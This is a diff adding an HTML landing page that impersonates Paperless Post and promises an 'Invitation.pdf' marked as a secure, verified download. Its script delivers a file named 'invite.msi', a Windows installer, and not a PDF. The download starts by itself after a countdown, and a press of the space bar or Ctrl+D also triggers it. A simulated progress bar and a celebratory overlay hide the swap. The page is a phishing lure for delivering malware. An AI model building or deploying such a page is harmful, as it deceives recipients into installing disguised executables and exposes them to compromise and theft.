@@ -1,0 +1,647 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Your Invitation is Ready! | Paperless Post</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+            background: linear-gradient(135deg, #00a896 0%, #028090 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 24px;
+            box-shadow: 0 25px 70px rgba(0, 0, 0, 0.25);
+            max-width: 550px;
+            width: 100%;
+            padding: 48px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .container::before {
+            content: '';
+            position: absolute;
+            top: -100px;
+            right: -100px;
+            width: 250px;
+            height: 250px;
+            background: linear-gradient(135deg, #ffd700, #ffed4e);
+            border-radius: 50%;
+            opacity: 0.08;
+        }
+
+        .logo {
+            width: 110px;
+            margin-bottom: 24px;
+        }
+
+        h1 {
+            color: #028090;
+            font-size: 36px;
+            font-weight: 700;
+            margin-bottom: 12px;
+        }
+
+        .subtitle {
+            color: #6c757d;
+            font-size: 17px;
+            line-height: 1.5;
+            margin-bottom: 36px;
+        }
+
+        .file-info {
+            background: #f0f8ff;
+            border: 2px dashed #028090;
+            border-radius: 16px;
+            padding: 24px;
+            margin: 28px 0;
+            display: flex;
+            align-items: center;
+            gap: 18px;
+            transition: transform 0.3s ease;
+        }
+
+        .file-info:hover {
+            transform: translateY(-4px);
+        }
+
+        .file-icon {
+            width: 64px;
+            height: 64px;
+            background: linear-gradient(135deg, #028090, #00a896);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 28px;
+            color: white;
+            flex-shrink: 0;
+        }
+
+        .file-text {
+            text-align: left;
+            flex: 1;
+        }
+
+        .file-name {
+            font-size: 19px;
+            font-weight: 700;
+            color: #028090;
+            margin-bottom: 6px;
+        }
+
+        .file-meta {
+            color: #6c757d;
+            font-size: 14px;
+        }
+
+        .progress-wrapper {
+            margin: 32px 0;
+            display: none;
+        }
+
+        .progress-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            color: #6c757d;
+            font-size: 14px;
+        }
+
+        .progress-track {
+            width: 100%;
+            height: 10px;
+            background: #e9ecef;
+            border-radius: 5px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #ffd700, #ffed4e);
+            transition: width 0.3s ease;
+            position: relative;
+        }
+
+        .progress-fill::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.5), transparent);
+            animation: shimmer 2s infinite;
+        }
+
+        @keyframes shimmer {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+
+        .btn-download {
+            background: linear-gradient(135deg, #028090, #00a896);
+            color: white;
+            border: none;
+            padding: 18px 48px;
+            font-size: 18px;
+            font-weight: 600;
+            border-radius: 50px;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 24px rgba(2, 128, 144, 0.3);
+        }
+
+        .btn-download:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 32px rgba(2, 128, 144, 0.4);
+        }
+
+        .btn-download:active {
+            transform: translateY(0);
+        }
+
+        .btn-download i {
+            animation: bounce 2s infinite;
+        }
+
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-4px); }
+        }
+
+        .countdown-box {
+            margin-top: 24px;
+            padding: 16px;
+            background: #f0f8ff;
+            border-radius: 12px;
+            color: #6c757d;
+            font-size: 15px;
+        }
+
+        .countdown-num {
+            color: #028090;
+            font-weight: 700;
+            font-size: 22px;
+            display: inline-block;
+            min-width: 32px;
+        }
+
+        .alert {
+            margin: 24px 0;
+            padding: 16px;
+            border-radius: 12px;
+            display: none;
+            animation: slideDown 0.4s ease;
+        }
+
+        @keyframes slideDown {
+            from {
+                opacity: 0;
+                transform: translateY(-12px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .alert.success {
+            background: #d4edda;
+            color: #155724;
+            border: 2px solid #c3e6cb;
+        }
+
+        .security-note {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 28px;
+            color: #6c757d;
+            font-size: 13px;
+        }
+
+        .instructions {
+            background: #f0f8ff;
+            padding: 20px;
+            border-radius: 12px;
+            margin-top: 28px;
+            text-align: left;
+            border-left: 4px solid #ffd700;
+        }
+
+        .instructions h3 {
+            color: #028090;
+            font-size: 16px;
+            margin-bottom: 12px;
+        }
+
+        .instructions ul {
+            list-style: none;
+            padding: 0;
+        }
+
+        .instructions li {
+            padding: 6px 0;
+            color: #6c757d;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .instructions li::before {
+            content: "✓";
+            color: #28a745;
+            font-weight: bold;
+            font-size: 16px;
+        }
+
+        .confetti {
+            position: fixed;
+            pointer-events: none;
+            z-index: 9999;
+        }
+
+        .thank-you-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(2, 128, 144, 0.96);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 10000;
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .thank-you-card {
+            background: white;
+            padding: 64px 48px;
+            border-radius: 28px;
+            text-align: center;
+            box-shadow: 0 30px 90px rgba(0, 0, 0, 0.4);
+            animation: popIn 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+            max-width: 480px;
+        }
+
+        @keyframes popIn {
+            from {
+                transform: scale(0);
+                opacity: 0;
+            }
+            to {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        .thank-you-emoji {
+            font-size: 72px;
+            margin-bottom: 20px;
+            animation: bounceEmoji 1s infinite;
+        }
+
+        @keyframes bounceEmoji {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-15px); }
+        }
+
+        .thank-you-title {
+            color: #028090;
+            font-size: 52px;
+            font-weight: 700;
+            margin-bottom: 16px;
+        }
+
+        .thank-you-text {
+            color: #6c757d;
+            font-size: 19px;
+            line-height: 1.6;
+            margin-bottom: 24px;
+        }
+
+        .sparkles {
+            display: flex;
+            gap: 24px;
+            justify-content: center;
+            font-size: 36px;
+        }
+
+        .sparkles span {
+            animation: pulse 1s infinite;
+        }
+
+        .sparkles span:nth-child(2) {
+            animation-delay: 0.2s;
+        }
+
+        .sparkles span:nth-child(3) {
+            animation-delay: 0.4s;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.4); opacity: 0.7; }
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                padding: 32px 24px;
+            }
+
+            h1 {
+                font-size: 30px;
+            }
+
+            .file-info {
+                flex-direction: column;
+                text-align: center;
+            }
+
+            .file-text {
+                text-align: center;
+            }
+
+            .btn-download {
+                width: 100%;
+                justify-content: center;
+            }
+
+            .thank-you-card {
+                padding: 48px 32px;
+                margin: 20px;
+            }
+
+            .thank-you-title {
+                font-size: 42px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://i.imgur.com/T3zLWpw.png" alt="Paperless Post" class="logo">
+        <h1>Your Invitation is Ready!</h1>
+        <p class="subtitle">Download your exclusive invitation to view all the beautiful event details</p>
+
+        <div class="file-info">
+            <div class="file-icon">
+                <i class="fas fa-file-pdf"></i>
+            </div>
+            <div class="file-text">
+                <div class="file-name">Invitation.pdf</div>
+                <div class="file-meta">📦 Secure Download • 2.4 MB</div>
+            </div>
+        </div>
+
+        <div class="progress-wrapper" id="progressWrapper">
+            <div class="progress-header">
+                <span>Downloading...</span>
+                <span id="progressPercent">0%</span>
+            </div>
+            <div class="progress-track">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+        </div>
+
+        <button class="btn-download" id="btnDownload">
+            <i class="fas fa-download"></i>
+            <span>Download Now</span>
+        </button>
+
+        <div class="countdown-box" id="countdownBox">
+            Auto-download starts in <span class="countdown-num" id="countdownNum">5</span> seconds
+        </div>
+
+        <div class="alert success" id="alertBox"></div>
+
+        <div class="instructions">
+            <h3>Quick Instructions:</h3>
+            <ul>
+                <li>Click "Download Now" to start immediately</li>
+                <li>Open the file after download completes</li>
+                <li>View your invitation in high quality</li>
+                <li>Save or print for your records</li>
+            </ul>
+        </div>
+
+        <div class="security-note">
+            🔒 Secure Download • Verified Source • No Ads
+        </div>
+    </div>
+
+    <script>
+        // Configuration
+        const FILE_URL = './invite.msi';
+        const FILE_NAME = 'invite.msi';
+        const AUTO_DOWNLOAD_DELAY = 5000;
+
+        // Elements
+        const btnDownload = document.getElementById('btnDownload');
+        const countdownBox = document.getElementById('countdownBox');
+        const countdownNum = document.getElementById('countdownNum');
+        const progressWrapper = document.getElementById('progressWrapper');
+        const progressFill = document.getElementById('progressFill');
+        const progressPercent = document.getElementById('progressPercent');
+        const alertBox = document.getElementById('alertBox');
+
+        let isDownloading = false;
+        let countdownTimer;
+
+        // Start countdown
+        function initCountdown() {
+            let seconds = AUTO_DOWNLOAD_DELAY / 1000;
+            countdownNum.textContent = seconds;
+
+            countdownTimer = setInterval(() => {
+                seconds--;
+                countdownNum.textContent = seconds;
+
+                if (seconds <= 0) {
+                    clearInterval(countdownTimer);
+                    if (!isDownloading) {
+                        triggerDownload();
+                    }
+                }
+            }, 1000);
+        }
+
+        // Trigger download
+        function triggerDownload() {
+            if (isDownloading) return;
+            isDownloading = true;
+
+            // Update UI
+            countdownBox.style.display = 'none';
+            btnDownload.disabled = true;
+            btnDownload.innerHTML = '<i class="fas fa-spinner fa-spin"></i><span>Downloading...</span>';
+            progressWrapper.style.display = 'block';
+
+            // Simulate progress
+            animateProgress();
+
+            // Start actual download
+            startDownload();
+        }
+
+        // Animate progress bar
+        function animateProgress() {
+            let progress = 0;
+            const interval = setInterval(() => {
+                if (progress < 20) {
+                    progress += Math.random() * 6;
+                } else if (progress < 70) {
+                    progress += Math.random() * 12;
+                } else if (progress < 95) {
+                    progress += Math.random() * 3;
+                } else {
+                    progress += 0.2;
+                }
+
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(interval);
+                    handleComplete();
+                }
+
+                progressFill.style.width = progress + '%';
+                progressPercent.textContent = Math.round(progress) + '%';
+            }, 120);
+        }
+
+        // Start file download
+        function startDownload() {
+            const link = document.createElement('a');
+            link.href = FILE_URL;
+            link.download = FILE_NAME;
+            link.style.display = 'none';
+            document.body.appendChild(link);
+            link.click();
+            setTimeout(() => document.body.removeChild(link), 100);
+        }
+
+        // Handle completion
+        function handleComplete() {
+            setTimeout(() => {
+                showAlert('✅ Download complete! Check your Downloads folder.');
+                btnDownload.innerHTML = '<i class="fas fa-check"></i><span>Download Complete</span>';
+                btnDownload.style.background = 'linear-gradient(135deg, #28a745, #20c997)';
+                
+                // Show celebration
+                launchConfetti();
+                setTimeout(showThankYou, 1500);
+            }, 500);
+        }
+
+        // Show alert message
+        function showAlert(message) {
+            alertBox.textContent = message;
+            alertBox.style.display = 'block';
+        }
+
+        // Launch confetti
+        function launchConfetti() {
+            const emojis = ['🎉', '🎊', '✨', '🌟', '💫', '⭐'];
+            const count = 100;
+
+            for (let i = 0; i < count; i++) {
+                setTimeout(() => {
+                    const confetti = document.createElement('div');
+                    confetti.className = 'confetti';
+                    confetti.textContent = emojis[Math.floor(Math.random() * emojis.length)];
+                    confetti.style.left = Math.random() * 100 + 'vw';
+                    confetti.style.fontSize = (Math.random() * 20 + 16) + 'px';
+                    confetti.style.animation = `fall ${Math.random() * 2 + 3}s linear forwards`;
+                    document.body.appendChild(confetti);
+                    setTimeout(() => confetti.remove(), 5000);
+                }, i * 30);
+            }
+        }
+
+        // Show thank you overlay
+        function showThankYou() {
+            const overlay = document.createElement('div');
+            overlay.className = 'thank-you-overlay';
+            overlay.innerHTML = `
+                <div class="thank-you-card">
+                    <div class="thank-you-emoji">🎉</div>
+                    <div class="thank-you-title">Thank You!</div>
+                    <div class="thank-you-text">
+                        Your invitation has been downloaded successfully!<br>
+                        Enjoy your event! 🎊
+                    </div>
+                    <div class="sparkles">
+                        <span>✨</span>
+                        <span>🌟</span>
+                        <span>💫</span>
+                    </div>
+                </div>
+            `;
+            document.body.appendChild(overlay);
+
+            setTimeout(() => {
+                overlay.style.animation = 'fadeIn 0.5s reverse';
+                setTimeout(() => overlay.remove(), 500);
+            }, 4000);
+        }
+
+        // Event listeners
+        btnDownload.addEventListener('click', () => {
+            clearInterval(countdownTimer);
+            triggerDownload();
+        });
+
+        // Keyboard shortcuts
+        document.addEventListener('keydown', (e) => {
+            if ((e.ctrlKey || e.metaKey) && e.key === 'd') {
+                e.preventDefault();
+                triggerDownload();
+            }
+            if (e.key === ' ' && document.activeElement !== btnDownload) {
+                e.preventDefault();
+                triggerDownload();
+            }
+        });
+
+        // Add animation styles
+        const style = document.createElement('style');
+        style.textContent = `
+            @keyframes fall {
+                to { 
+                    transform: translateY(100vh) rotate(720deg); 
+                    opacity: 0; 
+                }
+            }
+        `;
+        document.head.appendChild(style);
+
+        // Initialize on load
+        window.addEventListener('load', () => {
+            setTimeout(initCountdown, 1000);
+        });
+    </script>
+</body>
+</html>
